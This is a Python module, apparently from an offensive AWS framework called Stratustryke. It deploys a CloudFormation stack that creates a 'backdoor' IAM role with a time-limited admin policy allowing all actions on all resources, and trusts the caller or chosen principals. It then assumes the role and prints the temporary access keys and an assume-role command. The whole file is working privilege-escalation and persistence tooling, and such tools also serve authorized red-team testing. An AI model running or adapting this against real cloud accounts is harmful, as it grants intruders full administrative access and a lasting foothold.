
import time

from json import dumps
from uuid import uuid4
from datetime import datetime, timezone, timedelta

from stratustryke.core.module.aws import AWSModule
from stratustryke.settings import on_linux
from stratustryke.lib import StratustrykeException
from stratustryke.lib.regex import (
    AWS_ASSUMED_ROLE_ARN_REGEX,
    AWS_PRINCIPAL_ARN_REGEX,
    AWS_ACCOUNT_ID_REGEX, 
    AWS_SERVICE_PRINCIPAL_REGEX,
    AWS_ROLE_ARN_REGEX
)

class Module(AWSModule):

    OPT_STACK_NAME = 'STACK_NAME'
    OPT_STACK_ROLE = 'STACK_ROLE'
    OPT_TRUST_PRINCIPAL = 'TRUST_PRINCIPAL'
    OPT_EXTERNAL_ID = 'EXTERNAL_ID'
    OPT_NEW_ROLE_NAME = 'NEW_ROLE_NAME'
    OPT_STACK_DESCRIPTION = 'DESCRIPTION'
    OPT_VALID_HOURS = 'VALID_HOURS'
    OPT_POLL_DELAY = 'POLL_DELAY'
    OPT_TIMEOUT = 'TIMEOUT_SECONDS'
    OPT_SKIP_IMPORT = 'SKIP_IMPORT'
    # OPT_STACK_TEMPLATE = 'STACK_TEMPLATE'

    def __init__(self, framework) -> None:
        super().__init__(framework)
        self._info = {
            'Authors': ['@vexance'],
            'Description': 'Deploy a Cloudformation stack which creates a backdoor IAM role',
            'Details': 'Uses cloudformation:CreateStack to create an IAM role ',
            'References': [ '' ]
        }

        self._options.add_string(Module.OPT_STACK_NAME, 'Override gerneated name for the stack when it is deployed', True)
        self._options.add_string(Module.OPT_STACK_ROLE, 'When set, passes this role to the stack. Otherwise uses caller permissions', False)
        self._options.add_string(Module.OPT_TRUST_PRINCIPAL, 'AWS / service principals to include in the role trust policy (s/f/p)', False)
        self._options.add_string(Module.OPT_NEW_ROLE_NAME, 'Override the default generated name to use for the created role', False)

        self._advanced.add_integer(Module.OPT_POLL_DELAY, 'Time in seconds to wait while monitoring stack creation status', True, 5)
        self._advanced.add_integer(Module.OPT_TIMEOUT, 'Seconds to wait before determining a creation timeout occured', False, 120)
        self._advanced.add_integer(Module.OPT_VALID_HOURS, 'Number of hours for created role permissions to be valid for', True, 72)
        self._advanced.add_string(Module.OPT_STACK_DESCRIPTION, 'Override the stack description', False)
        self._advanced.add_boolean(Module.OPT_EXTERNAL_ID, 'When enabled, generates a random external id to use in the trust policy', True, True)
        self._advanced.add_boolean(Module.OPT_SKIP_IMPORT, 'When enabled, do not import backdoor role credentials into framework', False, False)
        # self._advanced.add_string(Module.OPT_STACK_TEMPLATE, 'Url, YAML, JSON; override default template & ignore TRUST_PRINCIPAL (f/p)', False)

    
    @property
    def search_name(self):
        return f'aws/cloudformation/privesc/{self.name}'
    

    def build_trust_policy(self, external_id: str | None) -> dict | None:
        '''Returns a default trust policy based of the specified TRUST_PRINCIPAL'''

        # Parse trusted role principals
        trust_principals = self.get_opt_multiline(Module.OPT_TRUST_PRINCIPAL)
        if trust_principals == None or trust_principals == ['']:
            caller_arn = self.get_cred().arn
            if not caller_arn:
                self.print_error('No trust principals supplied and unable to derive caller ARN')
                return None
            else:
                if AWS_ASSUMED_ROLE_ARN_REGEX.match(caller_arn):
                    caller_arn = self.resolve_assumed_role_arn(caller_arn)
                self.print_warning(f'No trust principals supplied, defaulting to {caller_arn}')
                trust_principals = [caller_arn]


        principal_block = {'AWS': [], 'Service': []}
        for line in trust_principals:

            if AWS_ASSUMED_ROLE_ARN_REGEX.match(line):
                iam_role_arn = self.resolve_assumed_role_arn(line)
                principal_block['AWS'].append(iam_role_arn)

            elif AWS_PRINCIPAL_ARN_REGEX.match(line):
                principal_block['AWS'].append(line)

            elif AWS_ACCOUNT_ID_REGEX.match(line):
                principal_block['AWS'].append(f'arn:aws:iam::{line}:root')

            elif AWS_SERVICE_PRINCIPAL_REGEX.match(line):
                principal_block['Service'].append(line)

            else:
                if self.verbose: self.print_warning(f'{line} does not match an AWS or service principal, skipping...')            

        msg = f'Built policy with {len(principal_block["AWS"]) + len(principal_block["Service"])} trusted principals'

        condition_block = {}
        if external_id:
            condition_block['StringEquals'] = {}
            condition_block['StringEquals']['sts:ExternalId'] = external_id
            msg += ' requiring external id'
            self.print_status(f'Applying {external_id} as sts:ExternalId within the trust policy')

        if self.verbose: self.print_status(msg)

        return {
            'Version': '2012-10-17',
            'Statement': {
                'Effect': 'Allow',
                'Action': 'sts:AssumeRole',
                'Principal': principal_block,
                'Condition': condition_block
            }
        }
    

    def create_and_expiry_datetimes(self) -> tuple[str]:
        '''Return datetime now() and another datetime based off the module expiration timeframe'''
        valid_hours = self.get_opt(Module.OPT_VALID_HOURS)
        if valid_hours < 1:
            valid_hours = abs(valid_hours)
            self.print_warning(f'VALID_HOURS must be positive, defaulting to absolute value of the option ({valid_hours})')
        
        # Zulu == UTC
        utc_now = datetime.now(timezone.utc)
        expiration = utc_now + timedelta(hours=valid_hours)

        utc_now = utc_now.strftime('%Y-%m-%dT%H:%M:%SZ')
        expiration = expiration.strftime('%Y-%m-%dT%H:%M:%SZ')

        self.print_status(f'Role permissions will be disarmed at {expiration}')
        return utc_now, expiration
    

    def build_default_stack_template(self, new_role_name: str, trust_policy: dict) -> dict | None:
        '''Returns a stack template after injecting module options into it'''
        
        description = self.get_opt(Module.OPT_STACK_DESCRIPTION)
        utc_now, utc_expiry = self.create_and_expiry_datetimes()
        if not description: description = f'Stack created by Stratustryke backdoor_role_create module at approximately {utc_now}'

        return {
            'AWSTemplateFormatVersion': '2010-09-09',
            'Description': description,
            'Resources': {
                new_role_name: {
                    'Type': 'AWS::IAM::Role',
                    'Properties': {
                        'AssumeRolePolicyDocument': trust_policy,
                        'RoleName': new_role_name,
                        'Policies': [
                            {
                                'PolicyName': 'StratustrykeInlineAdminPolicy',
                                'PolicyDocument': {
                                    'Version': '2012-10-17',
                                    'Statement': [
                                        {
                                            'Sid': 'AllowAdminPermissionsUntilDate',
                                            'Effect': 'Allow',
                                            'Action': ['*'],
                                            'Resource': ['*'],
                                            'Condition': {
                                                'DateLessThan': {
                                                    'aws:CurrentTime': utc_expiry
                                                }
                                            }
                                        }
                                    ]
                                }
                            }
                        ]
                    }
                }
            },
            'Outputs': {
                'RoleName': {
                    'Value': {'Ref': new_role_name},
                    'Description': 'The name of the created IAM role'
                },
                'RoleArn': {
                    'Value': {'Fn::GetAtt': [new_role_name, 'Arn']},
                    'Description': 'The ARN of the created IAM role'
                }
            }
        }


    def resolve_stack_role(self) -> str | None:
        '''If an ARN isn\'t provided (role name is given) default to the caller\'s AWS account to resolve the ARN'''
        try:
            stack_role = self.get_opt(Module.OPT_STACK_ROLE)
            if stack_role != None:
                if not AWS_ROLE_ARN_REGEX.match(stack_role):
                    # Might need to be service-role, idk
                    stack_role = f'arn:aws:iam::{self.get_cred().account_id}:role/{stack_role}'
                    self.print_warning(f'Provided stack role is not an ARN; resolving to {stack_role}')

            return stack_role
        
        except Exception as err:
            self.print_failure(f'Error encountered deriving STACK_ROLE parameter')
            if self.verbose: self.print_error(str(err))
            return None


    def resolve_assumed_role_arn(self, sts_arn: str) -> str:
        '''Derive IAM role ARN from an sts assumed-role ARN'''
        # 0  1   2  3 4            5            6                    7
        # arn:aws:sts::ACCOUNT_ID:assumed-role/ROLE_NAME/SESSION_NAME
        account_id = sts_arn.split(':')[4]
        role_name = sts_arn.split('/')[1]

        return f'arn:aws:iam::{account_id}:role/{role_name}'


    def create_escalation_stack(self, region: str, name: str, template: dict) -> str | None:
        '''Deploy the provided stack tempalte and return the stack identifier'''
        session = self.get_cred().session(region)
        stack_role = self.resolve_stack_role()

        try:
            client = session.client('cloudformation')
            create_stack_params = {
                'StackName': name,
                'TemplateBody': dumps(template),
                'Capabilities': ['CAPABILITY_NAMED_IAM'],
                'OnFailure': 'DELETE'
            }
            
            if stack_role: create_stack_params['RoleARN'] = stack_role

            res = client.create_stack(**create_stack_params)
            stack_id = res.get('StackId', None)
            if not stack_id: raise StratustrykeException(f'Operation cloudformation:CreateStack completed but no stack id was returned: {res}')


        except Exception as err:
            self.print_failure(f'Exception thrown during cloudformation:CreateStack in {region} for {name}')
            if self.verbose: self.print_error(str(err))
            return None
        
        return stack_id
    

    def monitor_stack_deployment(self, region: str, stack_id: str) -> dict:
        '''Monitor stack creation progress until it reaches either a success or failure state'''

        session = self.get_cred().session(region)
        timeout_seconds = self.get_opt(Module.OPT_TIMEOUT)
        delay = self.get_opt(Module.OPT_POLL_DELAY)

        fail_states = {'CREATE_FAILED','ROLLBACK_IN_PROGRESS','ROLLBACK_FAILED','ROLLBACK_COMPLETE','DELETE_FAILED'}
        success_state = 'CREATE_COMPLETE'
        start_time = time.time()


        while True:
            if time.time() - start_time > timeout_seconds:
                raise StratustrykeException(f'(StratustrykeException) Timeout occured while monitoring creation state for {stack_id}')
            
            try:
                client = session.client('cloudformation')
                res = client.describe_stacks(StackName=stack_id)

                stack = res.get('Stacks', [])[0]
                status = stack.get('StackStatus', 'UNKNOWN')
                status_reason = stack.get('StackStatusReason', '')

                if status == success_state:
                    # Copy output key:value pairs over into a dictionary
                    outputs = {
                        o['OutputKey']: o['OutputValue'] for o in stack.get('Outputs', [])
                    }

                    return {
                        'Success': True,
                        'Status': status,
                        'Reason': status_reason,
                        'Outputs': outputs
                    }
                
                elif status in fail_states:
                    events, primary_reason = self.get_stack_failure_events(region, stack_id)
                    return {
                        'Success': False,
                        'Status': status,
                        'Reason': f'{primary_reason or status_reason}',
                        'Outputs': events
                    }
 
            except Exception as err:
                msg = f'Exception thrown during cloudformation:DescribeStacks in {region} on {stack_id}'
                self.print_failure(msg)
                if self.verbose: self.print_error(str(err))
                return {
                        'Success': False,
                        'Status': 'EXCEPTION_THROWN',
                        'Reason': msg,
                        'Outputs': [str(err)]
                    }
            
            if self.verbose: self.print_status(f'Stack is in {status} state, sleeping {delay} seconds')
            time.sleep(delay)


    def get_stack_failure_events(self, region: str, stack_id: str) -> tuple:
        '''Try and get info on why stack creation failed'''
        failed_events = []
        primary_reason = None
        max_events = 50
        try:
            client = self.get_cred().session(region).client('cloudformation')
            paginator = client.get_paginator('describe_stack_events')
            
            for page in paginator.paginate(StackName=stack_id):
                for ev in page.get('StackEvents', []):
                    status = ev.get('ResourceStatus', '')

                    if status.endswith('FAILED'):
                        timestamp = ev.get('Timestamp', None)
                        if timestamp != None: timestamp = timestamp.isoformat()

                        entry = {
                            'Timestamp': timestamp,
                            'LogicalResourceId': ev.get('LogicalResourceId', None),
                            'PhysicalResourceId': ev.get('PhysicalResourceId', None),
                            'ResourceType': ev.get('ResourceType', None),
                            'ResourceStatus': status,
                            'ResourceStatusReason': ev.get('ResourceStatusReason', ''),
                        }
                        failed_events.append(entry)
                        if not primary_reason and entry['ResourceStatusReason']:
                            primary_reason = entry['ResourceStatusReason']

                        if len(failed_events) >= max_events:
                            break

                if len(failed_events) >= max_events:
                    break

        except Exception as err:
            self.print_failure(f'Exception during cloudformation:DescribeStackEvents in {region} for {stack_id}')
            if self.verbose: self.print_error(str(err))
            return None, None

        return failed_events, primary_reason



    def run(self):

        random_str = str(uuid4())[-12::]
        stack_name = self.get_opt(Module.OPT_STACK_NAME)
        if not stack_name: stack_name = f'StratustrykeEscStack{random_str}'

        external_id = self.get_opt(Module.OPT_EXTERNAL_ID)
        external_id = str(uuid4()) if external_id else None

        trust_policy = self.build_trust_policy(external_id)
        if trust_policy == None: return None

        new_role_name = self.get_opt(Module.OPT_NEW_ROLE_NAME)
        if not new_role_name: new_role_name = f'StratustrykeRole{random_str}'

        # Manually provided stack templates are currently not supported
        # Todo: provide an option to parse JSON/YAML provided via string/file/paste/etc
        # Default stack outputs will be RoleName and RoleArn
        stack_template = self.build_default_stack_template(new_role_name, trust_policy)

        region = self.get_regions(False)[0]

        stack_id = self.create_escalation_stack(region, stack_name, stack_template)
        if stack_id == None: return None

        self.print_status(f'Created stack: {stack_id}')
        self.print_status(f'Monitoring stack creation, this may take some time...')
        monitoring_output = self.monitor_stack_deployment(region, stack_id)

        ##### Failed to create #####
        if not monitoring_output.get('Success', False):
            self.print_failure(f'Backdoor role creation via Cloudformation:CreateStack failed')
            status = monitoring_output.get('Status')

            if status != 'EXCEPTION_THROWN': # Not already printed /logged
                reason = monitoring_output.get('Reason')
                self.print_failure(monitoring_output.get(f'({status}) {reason}'))

                if self.verbose:
                    for entry in monitoring_output.get('Outputs'):
                        self.print_error(entry)



        ##### Success #####
        self.print_status(f'Deployment succeeded for {stack_id}')
        role_arn = monitoring_output.get('Outputs', {}).get('RoleArn', None)
        self.print_success(f'Successfully created {role_arn}')


        ##### Attempt to assume the newly created role if caller is a trusted principal #####
        caller_arn = self.get_cred().arn
        if AWS_ASSUMED_ROLE_ARN_REGEX.match(caller_arn):
            caller_arn = self.resolve_assumed_role_arn(caller_arn)
        if caller_arn in trust_policy['Statement']['Principal']['AWS']:
                
            assumed_role_cred = self.get_cred().assume_role(role_arn, external_id)
            assumed_role_cred._alias = role_arn.split('/')[1]
                
            if self.get_opt(Module.OPT_SKIP_IMPORT): # Just print that it succeeded
                self.print_success(f'Successfully performed sts:AssumeRole on {role_arn}')
            else: # Add to cred db; should print itself anyway
                self.framework.credentials.store_credential(assumed_role_cred)


            env_prefix = 'export ' if on_linux else '$Env:'
            self.print_line(f'{env_prefix}AWS_ACCESS_KEY_ID={assumed_role_cred._access_key_id}')
            self.print_line(f'{env_prefix}AWS_SECRET_ACCESS_KEY={assumed_role_cred._secret_key}')
            self.print_line(f'{env_prefix}AWS_SESSION_TOKEN={assumed_role_cred._session_token}')
            self.print_line('')

        sts_command = f'aws sts assume-role --role-arn {role_arn} --role-session-name stratustryke'
        if external_id: sts_command += f' --external-id {external_id}'

        self.print_success(sts_command)

